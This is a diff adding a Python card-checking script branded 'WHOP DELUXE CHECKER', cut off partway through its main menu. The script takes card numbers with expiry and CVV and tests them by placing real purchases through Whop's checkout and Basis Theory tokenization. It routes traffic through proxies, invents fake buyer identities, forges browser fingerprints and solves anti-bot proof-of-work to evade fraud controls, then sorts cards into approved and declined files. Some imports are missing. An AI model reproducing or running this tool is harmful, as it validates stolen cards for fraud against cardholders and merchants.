@@ -1,0 +1,914 @@
+
+import hashlib
+import os
+import time
+import uuid
+import json
+import random
+import string
+import asyncio
+import re
+from typing import Optional, Dict, Any, List, Tuple
+from datetime import datetime
+
+import httpx
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  COLORS
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+class Colors:
+    HEADER = '\033[95m'
+    BLUE = '\033[94m'
+    CYAN = '\033[96m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
+    BOLD = '\033[1m'
+    DIM = '\033[2m'
+    RESET = '\033[0m'
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  PROGRESS LOGGER
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+class ProgressLogger:
+    def __init__(self, enabled: bool = False):
+        self.enabled = enabled
+        self.steps = []
+        self.current_step = 0
+
+    def step(self, message: str, status: str = "info"):
+        if not self.enabled:
+            return
+        self.current_step += 1
+        symbols = {
+            "info": f"{Colors.CYAN}[*]{Colors.RESET}",
+            "success": f"{Colors.GREEN}[✓]{Colors.RESET}",
+            "warning": f"{Colors.YELLOW}[!]{Colors.RESET}",
+            "error": f"{Colors.RED}[✗]{Colors.RESET}",
+            "pow": f"{Colors.YELLOW}[⚡]{Colors.RESET}",
+            "3ds": f"{Colors.BLUE}[🔒]{Colors.RESET}",
+            "card": f"{Colors.CYAN}[💳]{Colors.RESET}",
+            "fp": f"{Colors.BLUE}[👁]{Colors.RESET}",
+        }
+        symbol = symbols.get(status, symbols["info"])
+        print(f"  {symbol} {message}")
+        self.steps.append({"step": self.current_step, "message": message, "status": status})
+
+    def start(self):
+        if not self.enabled:
+            return
+        print(f"\n{Colors.CYAN}{'━' * 50}{Colors.RESET}")
+        print(f"{Colors.BOLD}PROCESSING{Colors.RESET}")
+        print(f"{Colors.CYAN}{'━' * 50}{Colors.RESET}")
+
+    def finish(self):
+        if not self.enabled:
+            return
+        print(f"{Colors.CYAN}{'━' * 50}{Colors.RESET}")
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  CONFIG
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+APPROVED_FILE = "whop_approved.txt"
+DECLINED_FILE = "whop_declined.txt"
+UNKNOWN_FILE = "whop_unknown.txt"
+PROXY_FILE = "px.txt"
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  PROXY
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def _load_proxy() -> Optional[str]:
+    if not os.path.exists(PROXY_FILE):
+        return None
+    try:
+        lines = [l.strip() for l in open(PROXY_FILE).readlines() if l.strip() and not l.startswith("#")]
+        return random.choice(lines) if lines else None
+    except:
+        return None
+
+def _load_all_proxies() -> List[str]:
+    if not os.path.exists(PROXY_FILE):
+        return []
+    try:
+        return [l.strip() for l in open(PROXY_FILE).readlines() if l.strip() and not l.startswith("#")]
+    except:
+        return []
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  RANDOM IDENTITY
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+_FIRST = ["james","john","robert","michael","william","david","richard","joseph",
+          "thomas","charles","emma","olivia","ava","isabella","sophia","mia",
+          "charlotte","amelia","harper","evelyn"]
+_LAST = ["smith","johnson","williams","brown","jones","garcia","miller","davis",
+         "wilson","taylor","anderson","thomas","jackson","white","harris","martin"]
+_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com","icloud.com"]
+
+def _rand_identity() -> tuple[str, str, str, str]:
+    first = random.choice(_FIRST).capitalize()
+    last = random.choice(_LAST).capitalize()
+    tag = "".join(random.choices(string.digits, k=random.randint(2, 5)))
+    email = f"{first.lower()}{last.lower()}{tag}@{random.choice(_DOMAINS)}"
+    phone = f"+1{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"
+    return first, last, email, phone
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  RANDOM UA
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+_UA_POOL = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
+]
+
+def _rand_ua() -> str:
+    return random.choice(_UA_POOL)
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  TRACE / SPAN / BAGGAGE
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def gen_trace() -> str:
+    return str(uuid.uuid4()).replace("-", "")
+
+def gen_span() -> str:
+    return uuid.uuid4().hex[:16]
+
+def gen_baggage(trace_id: str, release: str) -> str:
+    return (
+        f"sentry-environment=production,sentry-release={release},"
+        f"sentry-public_key=c6989961c9181cc2db941b290d874f29,"
+        f"sentry-trace_id={trace_id},sentry-org_id=1320754,"
+        f"sentry-sampled=true,sentry-sample_rand={str(uuid.uuid4().int % 10000000000000000 / 10000000000000000)[:17]},"
+        f"sentry-sample_rate=1"
+    )
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  FINGERPRINT Bypass 
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+_FP_V1_HASH_TMPL = "4b536f5cb86ab2daf3d04a272d8b3817"
+_FP_V1S_HASH_TMPL = "eae1bbcaefa5a83e881161b62f1253c1"
+_FP_V2_HASH_TMPL = "6c18ba582e42e6239a56394f6b87b715"
+
+FP_V1_STR = '{"user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36","language":"en-US","resolution":[1920,1080],"available_resolution":[1920,1040],"timezone_offset":-300,"navigator_platform":"Win32","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"touch_support":[1,true,true],"js_fonts":["Arial","Calibri","Cambria","Consolas","Courier New","Georgia","Helvetica","Impact","Tahoma","Times New Roman","Trebuchet MS","Verdana"]}'
+FP_V1S_STR = '{"language":"en-US","resolution":[1920,1080],"available_resolution":[1920,1040],"timezone_offset":-300,"navigator_platform":"Win32","regular_plugins":["PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf","Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf"],"adblock":false,"touch_support":[1,true,true],"js_fonts":["Arial","Calibri","Cambria","Consolas","Courier New","Georgia","Helvetica","Impact","Tahoma","Times New Roman","Trebuchet MS","Verdana"]}'
+FP_V2_STR = '{"fonts":["Arial","Calibri","Cambria","Consolas","Courier New","Georgia","Helvetica","Impact","Tahoma","Times New Roman","Trebuchet MS","Verdana"],"font_preferences":{"default":120,"apple":120,"serif":120,"sans":115,"mono":97,"min":7,"system":118},"audio":124.04347527516074,"screen_frame":[0,0,50,0],"languages":[["en-US"]],"device_memory":8,"screen_resolution":[1080,1920],"hardware_concurrency":8,"timezone":"America/New_York","indexed_db":true,"open_database":false,"platform":"Win32","plugins":[{"name":"PDF Viewer","description":"Portable Document Format","mimeTypes":[{"type":"application/pdf","suffixes":"pdf"}]}],"canvas":{"winding":true},"touch_support":{"maxTouchPoints":1,"touchEvent":true,"touchStart":true},"vendor_flavors":["chrome"],"color_gamut":"srgb","forced_colors":false,"monochrome":0,"contrast":0,"reduced_motion":false,"hdr":false}'
+
+def _rand_fp(ua: str):
+    _US_TZ = [
+        ("America/New_York", -300, "en-US,en;q=0.9"),
+        ("America/Chicago", -360, "en-US,en;q=0.9"),
+        ("America/Denver", -420, "en-US,en;q=0.9"),
+        ("America/Los_Angeles", -480, "en-US,en;q=0.9"),
+    ]
+    _SCREEN = [(1920, 1080, 1920, 1040), (1366, 768, 1366, 728), (1536, 864, 1536, 824)]
+
+    tz_name, tz_off, lang = random.choice(_US_TZ)
+    sw, sh, aw, ah = random.choice(_SCREEN)
+    hw = random.choice([4, 6, 8, 12, 16])
+    mem = random.choice([4, 8, 16])
+    lt = lang.split(",")[0]
+
+    def rh() -> str:
+        return "".join(random.choices("0123456789abcdef", k=32))
+
+    h1, h1s, h2 = rh(), rh(), rh()
+
+    v1 = (FP_V1_STR
+          .replace('"user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"', f'"user_agent":{json.dumps(ua)}')
+          .replace('"language":"en-US"', f'"language":"{lt}"')
+          .replace('"timezone_offset":-300', f'"timezone_offset":{tz_off}')
+          .replace('"resolution":[1920,1080]', f'"resolution":[{sw},{sh}]')
+          .replace('"available_resolution":[1920,1040]', f'"available_resolution":[{aw},{ah}]'))
+    v1s = (FP_V1S_STR
+           .replace('"language":"en-US"', f'"language":"{lt}"')
+           .replace('"timezone_offset":-300', f'"timezone_offset":{tz_off}')
+           .replace('"resolution":[1920,1080]', f'"resolution":[{sw},{sh}]')
+           .replace('"available_resolution":[1920,1040]', f'"available_resolution":[{aw},{ah}]'))
+    v2 = (FP_V2_STR
+          .replace('"languages":[["en-US"]]', f'"languages":[["{lt}"]]')
+          .replace('"device_memory":8', f'"device_memory":{mem}')
+          .replace('"screen_resolution":[1080,1920]', f'"screen_resolution":[{sh},{sw}]')
+          .replace('"hardware_concurrency":8', f'"hardware_concurrency":{hw}')
+          .replace('"timezone":"America/New_York"', f'"timezone":"{tz_name}"'))
+
+    return v1, v1s, v2, h1, h1s, h2, tz_name, tz_off, lang, sw, sh
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  EXTRACTOR
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def extract_dynamic(html: str):
+    next_data = None
+    m = re.search(r'<script id="__NEXT_DATA__" type="application/json">(.*?)</script>', html)
+    if m:
+        try:
+            next_data = json.loads(m.group(1))
+        except:
+            pass
+
+    def rec(obj, pat):
+        if isinstance(obj, dict):
+            for k, v in obj.items():
+                if isinstance(v, str):
+                    mm = re.search(pat, v)
+                    if mm:
+                        return mm.group(0)
+                elif isinstance(v, (dict, list)):
+                    res = rec(v, pat)
+                    if res:
+                        return res
+        elif isinstance(obj, list):
+            for item in obj:
+                res = rec(item, pat)
+                if res:
+                    return res
+        return None
+
+    def find_plan(obj):
+        if isinstance(obj, dict):
+            if obj.get("id", "").startswith("plan_") and ("formattedPeriodV2" in obj or "initialPrice" in obj or "rawInitialPrice" in obj):
+                return obj.get("id")
+            for k, v in obj.items():
+                res = find_plan(v)
+                if res:
+                    return res
+        elif isinstance(obj, list):
+            for item in obj:
+                res = find_plan(item)
+                if res:
+                    return res
+        return None
+
+    plan_id = account_id = bt_key = container = release = None
+
+    if next_data:
+        plan_id = find_plan(next_data) or rec(next_data, r'plan_[a-zA-Z0-9]+')
+        account_id = rec(next_data, r'biz_[a-zA-Z0-9]+')
+        bt_key = rec(next_data, r'key_prod_us_pub_[a-zA-Z0-9]+')
+        container = rec(next_data, r'/?\?/?card-assembly/[a-zA-Z0-9]+/?\?/?')
+        if container:
+            container = container.replace('\\', '')
+        release = rec(next_data, r'"release":"([a-f0-9]{40})"')
+
+    if not plan_id:
+        plan_id = (re.findall(r'plan_[a-zA-Z0-9]+', html) or [None])[0]
+    if not account_id:
+        account_id = (re.findall(r'biz_[a-zA-Z0-9]+', html) or [None])[0]
+    if not bt_key:
+        m2 = re.search(r'key_prod_us_pub_[a-zA-Z0-9]+', html)
+        if m2:
+            bt_key = m2.group(0)
+    if not container:
+        m2 = re.search(r'/card-assembly/[a-zA-Z0-9]+/', html)
+        if m2:
+            container = m2.group(0)
+    if not release:
+        m2 = re.search(r'"release":"([a-f0-9]{40})"', html) or re.search(r'"buildId":"([a-f0-9]{40})"', html)
+        if m2:
+            release = m2.group(1)
+
+    return plan_id, account_id, bt_key, container, release or "unknown"
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  RESPONSE PARSER
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def get_message(resp: Any) -> Optional[str]:
+    if not isinstance(resp, dict):
+        return None
+
+    for key in ("last_confirmation_error", "last_confirm_error"):
+        lce = resp.get(key)
+        if isinstance(lce, dict):
+            msg = lce.get("message")
+            if msg:
+                return msg
+
+    payment = resp.get("payment")
+    if isinstance(payment, dict):
+        for k in ("last_payment_error", "error"):
+            lpe = payment.get(k)
+            if isinstance(lpe, dict):
+                msg = lpe.get("message")
+                if msg:
+                    return msg
+
+        if payment.get("decline_code"):
+            return f"Declined: {payment['decline_code']}"
+
+        if payment.get("status", "").lower() in ("failed", "declined", "canceled"):
+            return payment.get("message") or payment["status"]
+
+    if resp.get("decline_code"):
+        return f"Declined: {resp['decline_code']}"
+
+    if resp.get("status", "").lower() in ("failed", "declined", "canceled"):
+        return resp.get("message") or resp["status"]
+
+    return None
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  HEADERS BUILDER
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def _base_headers(ua: str, referer: str, release: str, ssk: str = "") -> dict:
+    trace = gen_trace()
+    return {
+        "accept": "*/*",
+        "accept-language": "en-US,en;q=0.9",
+        "api-version-date": "2026-08-21",
+        "origin": "https://whop.com",
+        "referer": referer,
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
+        "priority": "u=1, i",
+        "sentry-trace": f"{trace}-{gen_span()}-1",
+        "baggage": gen_baggage(trace, release),
+        "whop-private-schema": "true",
+        "x-fern-language": "JavaScript",
+        "x-fern-runtime": "browser",
+        "x-fern-runtime-version": ua,
+        "user-agent": ua,
+        "x-ssk": ssk,
+    }
+
+def _json_headers(ua: str, referer: str, release: str, ssk: str = "") -> dict:
+    h = _base_headers(ua, referer, release, ssk)
+    h["content-type"] = "application/json"
+    return h
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  POW BYPASS 
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def solve_pow(base: str, prefix: str, suffix: str, max_iter: int = 500_000) -> Optional[int]:
+    for i in range(1, max_iter):
+        if hashlib.sha256(f"{base}:{i}:{suffix}".encode()).hexdigest().startswith(prefix):
+            return i
+    return None
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  MAIN PROCESS
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+async def _run_with_client(
+    client: httpx.AsyncClient,
+    url: str,
+    cc: str, mes: str, ano: str, cvv: str,
+    proxy: Optional[str] = None,
+    progress: Optional[ProgressLogger] = None,
+) -> Optional[Dict[str, Any]]:
+
+    # ─── RANDOM IDENTITY
+    first_name, last_name, email, phone = _rand_identity()
+    ua = _rand_ua()
+
+    # ─── FINGERPRINT BYPASS
+    v1_str, v1s_str, v2_str, h1, h1s, h2, tz_name, tz_off, lang, sw, sh = _rand_fp(ua)
+    if progress:
+        progress.step(f"Fingerprint generated: {h1[:16]}...", "fp")
+
+    # ─── SSK
+    ssk = ""
+    try:
+        with open("ssk.txt") as f:
+            ssk = f.read().strip()
+    except:
+        pass
+
+    parsed = urlparse(url)
+    affiliate = parse_qs(parsed.query).get("a", [""])[0]
+    referer = url
+
+    # ─── STEP 1: Landing page
+    if progress:
+        progress.step("Fetching landing page...", "info")
+    headers1 = {
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "accept-language": "en-US,en;q=0.9",
+        "cache-control": "max-age=0",
+        "sec-fetch-dest": "document",
+        "sec-fetch-mode": "navigate",
+        "sec-fetch-site": "same-origin",
+        "sec-fetch-user": "?1",
+        "upgrade-insecure-requests": "1",
+        "user-agent": ua,
+    }
+    r1 = await client.get(url, headers=headers1)
+    html = r1.text
+
+    plan_id, account_id, bt_key, container, release = extract_dynamic(html)
+    if not bt_key:
+        bt_key = "key_prod_us_pub_Ew4Bw1f81FPoqphvpuX1VR"
+    if not plan_id or not account_id:
+        if progress:
+            progress.step("Missing plan/account", "error")
+        return {"error": "Missing plan/account"}
+
+    if progress:
+        progress.step(f"Plan: {plan_id[:24]}...", "success")
+        progress.step(f"Account: {account_id[:24]}...", "success")
+
+    # ─── STEP 2: users/me
+    await client.get("https://whop.com/api/v1/users/me",
+                     headers=_base_headers(ua, referer, release, ssk))
+
+    # ─── STEP 3: checkout_sessions
+    if progress:
+        progress.step("Creating checkout session...", "info")
+    payload3 = {
+        "items": [{"plan": plan_id, "quantity": 1}],
+        "affiliate_code": affiliate,
+        "attribution": {"source": "product_page_direct"},
+        "tracking_link_ids_by_account": {},
+        "payment_method_types": ["card"],
+        "mode": "payment",
+        "buyer_email": email
+    }
+    r3 = await client.post("https://whop.com/api/v1/checkout_sessions",
+                           json=payload3,
+                           headers=_json_headers(ua, referer, release, ssk))
+    if r3.status_code >= 400:
+        if progress:
+            progress.step(f"Checkout failed: {r3.status_code}", "error")
+        return {"error": f"Checkout {r3.status_code}"}
+    data3 = r3.json()
+    chs_id = data3["id"]
+    client_secret = data3["client_secret"]
+    account_id = data3.get("seller", {}).get("id", account_id)
+
+    # ─── STEP 4: payment_method_types
+    await client.get(
+        f"https://whop.com/api/v1/payment_method_types?account_id={account_id}&surface=direct_checkout&plan_id={plan_id}",
+        headers=_base_headers(ua, referer, release, ssk)
+    )
+
+    # ─── STEP 5: calculate_breakdown
+    await client.post(
+        f"https://whop.com/api/v1/checkout_sessions/{chs_id}/calculate_breakdown",
+        json={"client_secret": client_secret, "supports_buyer_fee": True},
+        headers=_json_headers(ua, referer, release, ssk)
+    )
+
+    # ─── STEP 6: recognize
+    await client.post(
+        "https://whop.com/api/v1/session_intents/recognize",
+        json={"email": email},
+        headers=_json_headers(ua, referer, release, ssk)
+    )
+
+    # ─── STEP 7: BT session (Basis Theory)
+    if progress:
+        progress.step("Creating BT session...", "info")
+    device_info = {
+        "uaBrands": [
+            {"brand": "Not?A_Brand", "version": "8"},
+            {"brand": "Chromium", "version": "141"},
+            {"brand": "Google Chrome", "version": "141"}
+        ],
+        "uaMobile": False,
+        "uaPlatform": "Windows",
+        "languages": ["en-US", "en"],
+        "timeZone": tz_name,
+        "cookiesEnabled": True,
+        "localStorageEnabled": True,
+        "sessionStorageEnabled": True,
+        "platform": "Win32",
+        "hardwareConcurrency": 8,
+        "deviceMemoryGb": 8,
+        "screenWidth": sw,
+        "screenHeight": sh,
+        "screenAvailWidth": sw,
+        "screenAvailHeight": sh,
+        "innerWidth": sw,
+        "innerHeight": sh - 100,
+        "devicePixelRatio": 1,
+        "maxTouchPoints": 0,
+        "network": {},
+        "plugins": [],
+        "mimeTypes": [],
+        "webdriver": False,
+        "suspectedHeadless": False,
+        "webglVendor": "Google Inc. (Intel)",
+        "webglRenderer": "ANGLE (Intel, Intel(R) UHD Graphics Direct3D11 vs_5_0 ps_5_0)"
+    }
+    headers7 = {
+        "accept": "application/json",
+        "accept-language": "en-US,en;q=0.9",
+        "content-type": "application/json",
+        "origin": "https://js.basistheory.com",
+        "referer": "https://js.basistheory.com/",
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
+        "user-agent": ua,
+        "bt-api-key": bt_key,
+    }
+    r7 = await client.post("https://js.basistheory.com/api/sessions",
+                           json={"deviceInfo": device_info},
+                           headers=headers7)
+    nonce = None
+    if r7.text:
+        try:
+            nonce = r7.json().get("nonce")
+        except:
+            pass
+
+    # ─── STEP 8: Card session
+    r8 = await client.post(
+        "https://whop.com/api/v1/payment_method_types/card/session",
+        json={"account_id": account_id, "origin": "https://whop.com", "nonce": nonce},
+        headers=_json_headers(ua, referer, release, ssk)
+    )
+    if r8.text:
+        try:
+            d8 = r8.json()
+            sc = d8.get("session", {}).get("container")
+            if sc:
+                container = sc if sc.startswith('/') else '/' + sc
+                if not container.endswith('/'):
+                    container += '/'
+        except:
+            pass
+    if not container:
+        container = "/card-assembly/cda4721bfd122ff8420a0bf4f47ea32e14125ef7d90d933bacb1a0b7fa9e82dd/"
+
+    # ─── STEP 9: BT tokenize
+    if progress:
+        progress.step("Tokenizing card...", "card")
+    expires = (datetime.utcnow() + timedelta(minutes=5)).strftime("%Y-%m-%dT%H:%M:%S.000Z")
+    headers9 = {
+        "accept": "application/json",
+        "accept-language": "en-US,en;q=0.9",
+        "content-type": "application/json",
+        "origin": "https://js.basistheory.com",
+        "referer": "https://js.basistheory.com/",
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
+        "user-agent": ua,
+        "bt-api-key": bt_key,
+    }
+    r9 = await client.post("https://js.basistheory.com/api/tokens",
+                           json={
+                               "type": "card",
+                               "containers": [container],
+                               "expires_at": expires,
+                               "data": {"number": cc}
+                           },
+                           headers=headers9)
+    card_token = None
+    if r9.text:
+        try:
+            card_token = r9.json().get("id") or r9.json().get("token")
+        except:
+            pass
+    if not card_token:
+        if progress:
+            progress.step("No card token", "error")
+        return {"error": "No card token"}
+
+    # ─── STEP 10: confirmation_tokens
+    if progress:
+        progress.step("Creating confirmation token...", "info")
+    exp_year = int(ano)
+    if exp_year < 100:
+        exp_year += 2000
+
+    payload10 = {
+        "account_id": account_id,
+        "payment_method": {
+            "type": "card",
+            "category": "card",
+            "card": {"token": card_token}
+        },
+        "billing_details": {
+            "email": email,
+            "name": f"{first_name} {last_name}",
+            "address": {
+                "country": "US",
+                "line1": f"{random.randint(100,9999)} Main St",
+                "city": "New York",
+                "state": "NY",
+                "postal_code": f"{random.randint(10000,99999)}"
+            }
+        },
+        "return_url": url,
+        "setup_future_usage": "off_session",
+        "browser_info": {
+            "platform": "Win32",
+            "color_depth": 24,
+            "screen_height": sh,
+            "screen_width": sw,
+            "javascript_enabled": True,
+            "language": "en-US",
+            "java_enabled": False,
+            "browser_time_difference": tz_off
+        }
+    }
+    headers10 = _json_headers(ua, referer, release, ssk)
+    headers10["authorization"] = "Bearer public"
+
+    r10 = await client.post("https://whop.com/api/v1/confirmation_tokens",
+                            json=payload10,
+                            headers=headers10)
+    ctok_id = None
+    if r10.text:
+        try:
+            ctok_id = r10.json().get("id")
+        except:
+            pass
+    if not ctok_id:
+        # Extract error message if any
+        try:
+            err_data = r10.json()
+            msg = get_message(err_data)
+            if msg:
+                return {"error": msg}
+        except:
+            pass
+        if progress:
+            progress.step("No confirmation token", "error")
+        return {"error": "No confirmation token"}
+
+    # ─── STEP 11: confirm
+    if progress:
+        progress.step("Confirming checkout...", "info")
+    payload11 = {
+        "client_secret": client_secret,
+        "confirmation_token": ctok_id,
+        "attestations": {"tos_accepted": True}
+    }
+    r11 = await client.post(
+        f"https://whop.com/api/v1/checkout_sessions/{chs_id}/confirm",
+        json=payload11,
+        headers=_json_headers(ua, referer, release, ssk)
+    )
+    if r11.text:
+        try:
+            confirm_data = r11.json()
+            msg = get_message(confirm_data)
+            if msg:
+                return {"error": msg}
+        except:
+            pass
+
+    # ─── STEP 12: Poll
+    if progress:
+        progress.step("Polling result...", "info")
+    for _ in range(12):
+        r12 = await client.get(
+            f"https://whop.com/api/v1/checkout_sessions/{chs_id}",
+            params={"client_secret": client_secret, "expand[]": "payment"},
+            headers=_base_headers(ua, referer, release, ssk)
+        )
+        if r12.text:
+            try:
+                cs = r12.json()
+                msg = get_message(cs)
+                if msg:
+                    return {"error": msg}
+                next_action = cs.get("next_action")
+                if isinstance(next_action, dict):
+                    t = next_action.get("type", "")
+                    if t in ("use_stripe_sdk", "redirect_to_url", "3ds"):
+                        return {"error": "3D Secure"}
+                payment = cs.get("payment") or {}
+                if isinstance(payment, dict):
+                    if payment.get("status", "").lower() in ("succeeded", "paid"):
+                        return {"success": True, "data": payment}
+                    if payment.get("status", "").lower() in ("requires_action", "requires_confirmation"):
+                        return {"error": "3D Secure / Processing"}
+            except:
+                pass
+        await asyncio.sleep(2)
+
+    return {"error": "Open/Processing"}
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  PROCESS WRAPPER
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+async def process_whop(
+    url: str,
+    cc: str, mes: str, ano: str, cvv: str,
+    proxy: Optional[str] = None,
+    progress: Optional[ProgressLogger] = None,
+) -> Optional[Dict[str, Any]]:
+
+    kw = {"timeout": 30}
+    if proxy:
+        kw["proxy"] = proxy
+        if progress:
+            progress.step(f"Using proxy: {proxy[:40]}...", "info")
+
+    try:
+        async with httpx.AsyncClient(**kw) as client:
+            result = await _run_with_client(client, url, cc, mes, ano, cvv, proxy, progress)
+            return result
+    except Exception as e:
+        return {"error": f"Request failed: {str(e)[:120]}"}
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  HELPERS
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def _fix_year(yy: str) -> str:
+    yy = yy.strip()
+    if len(yy) == 2:
+        return f"20{yy}"
+    return yy
+
+def _parse_card(raw: str):
+    parts = [p.strip() for p in raw.strip().split("|")]
+    if len(parts) != 4:
+        return None
+    cc, mes, ano, cvv = parts
+    if not cc or not mes or not ano or not cvv:
+        return None
+    return cc, mes, _fix_year(ano), cvv
+
+def _extract_result(result: Optional[Dict]) -> tuple[str, str]:
+    if result is None:
+        return "UNKNOWN", "No response"
+    if result.get("error"):
+        err = result["error"]
+        err_lower = err.lower()
+        if "3d secure" in err_lower or "requires_action" in err_lower:
+            return "3DS_REQUIRED", err
+        if "insufficient" in err_lower or "not enough" in err_lower:
+            return "INSUFFICIENT_FUNDS", err
+        if "cvv" in err_lower or "cvc" in err_lower:
+            return "CVV_MISMATCH", err
+        if "expired" in err_lower:
+            return "EXPIRED_CARD", err
+        if "declined" in err_lower or "decline" in err_lower:
+            return "DECLINED", err
+        if "rate limit" in err_lower:
+            return "RATE_LIMIT", err
+        return "ERROR", err
+    if result.get("success"):
+        return "APPROVED", "Payment Successful"
+    return "UNKNOWN", str(result)[:200]
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#  MAIN
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+async def main():
+    print(f"\n{Colors.CYAN}{'=' * 60}{Colors.RESET}")
+    print(f"{Colors.BOLD}{'WHOP DELUXE CHECKER v1.0'.center(60)}{Colors.RESET}")
+    print(f"{Colors.CYAN}{'=' * 60}{Colors.RESET}")
+
+    url = input(f"{Colors.CYAN}Whop URL{Colors.RESET}: ").strip()
+    if not url.startswith("http"):
+        url = "https://" + url
+
+    # ─── PROXY SORUSU
+    print(f"\n{Colors.CYAN}{'━' * 50}{Colors.RESET}")
+    print(f"{Colors.BOLD}PROXY (optional){Colors.RESET}")
+    print(f"{Colors.CYAN}{'━' * 50}{Colors.RESET}")
+    proxy_choice = input(f"{Colors.CYAN}Use proxy? [y/n]{Colors.RESET}: ").strip().lower()
+
+    proxy = None
+    if proxy_choice == "y":
+        proxies = _load_all_proxies()
+        if proxies:
+            print(f"{Colors.GREEN}[✓]{Colors.RESET} {len(proxies)} proxies loaded from {PROXY_FILE}")
+            mode = input(f"{Colors.CYAN}Mode [1=auto-rotate, 2=manual]{Colors.RESET}: ").strip()
+            if mode == "2":
